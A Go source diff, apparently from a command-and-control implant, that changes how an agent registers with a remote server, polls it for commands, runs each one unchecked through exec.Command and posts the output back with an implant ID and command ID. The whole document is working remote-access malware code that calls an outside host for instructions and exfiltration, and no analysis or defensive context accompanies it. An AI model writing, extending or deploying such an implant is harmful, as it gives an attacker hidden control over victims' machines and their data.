@@ -39,6 +39,7 @@ func register(serverIP string) string {
 	responseBody := bytes.NewBuffer(postBody)
 	resp_register, _ := http.Post("http://"+serverIP+":5000/api/1.1/add_agent", "application/json", responseBody)
 	body2, _ := ioutil.ReadAll(resp_register.Body)
+	fmt.Printf("%s", body2)
 	agent_id := string(body2)
 	return agent_id
 }
@@ -50,18 +51,22 @@ func get_command(agent_id string, serverIP string) {
 	postBody := bytes.NewBuffer(post_body)
 	resp_query, _ := http.Post("http://"+serverIP+":5000/api/1.1/get_command", "application/json", postBody)
 	resp, _ := ioutil.ReadAll(resp_query.Body)
-	command := string(resp)
+	out := string(resp)
+	tokens := strings.Split(out, ",")
+	command := tokens[0]
 	if command == "None" {
 		time.Sleep(1 * time.Second)
 	} else {
+		commandID := tokens[1]
 		args := strings.Split(command, " ")
 		parsed_command := args[0]
 		args = args[1:]
 		out, _ := exec.Command(parsed_command, args...).Output()
 		output := string(out[:])
 		resp_body, _ := json.Marshal(map[string]string{
-			"id":     agent_id,
-			"output": output,
+			"implantID": agent_id,
+			"commandID": commandID,
+			"output":    output,
 		})
 		responseBody := bytes.NewBuffer(resp_body)
 		resp_send_command, _ := http.Post("http://"+serverIP+":5000/api/1.1/command_out", "application/json", responseBody)
